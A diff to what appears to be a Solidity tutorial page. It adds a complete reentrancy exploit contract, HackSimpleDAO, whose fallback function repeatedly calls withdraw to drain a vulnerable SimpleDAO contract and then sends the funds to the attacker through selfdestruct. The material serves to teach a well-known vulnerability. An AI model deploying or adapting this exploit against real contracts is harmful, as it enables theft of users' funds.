@@ -26,6 +26,41 @@ contract SimpleDAO {
 }
 </pre>
 
+<hr/>
+
+Here is an example of how to hack SimpleDAO:
+
+<pre>
+pragma solidity ^0.5.0;
+
+interface SimpleDAOInterface {
+    function deposit() external payable;
+    function withdraw(uint amount) external;
+}
+
+contract HackSimpleDAO {
+    address simpleDAOAddr;
+    
+    function hack(address addr) public payable {
+        simpleDAOAddr = addr;
+
+        SimpleDAOInterface sd = SimpleDAOInterface(simpleDAOAddr);
+        sd.deposit.value(1 ether)();
+        sd.withdraw(1 ether);
+        
+        selfdestruct(msg.sender);
+    }
+
+    function () external payable {
+        uint256 balance = simpleDAOAddr.balance;
+        if (balance == 0) return;
+        if (balance > 1 ether) balance = 1 ether;
+        SimpleDAOInterface sd = SimpleDAOInterface(simpleDAOAddr);
+        sd.withdraw(balance);
+    }
+}
+</pre>
+
 <ul>
 
 <li>Create an interface so it's easy to call methods on the SimpleDAO contract. Note: in interfaces you need to change <code>public</code> to <code>external</code></li>
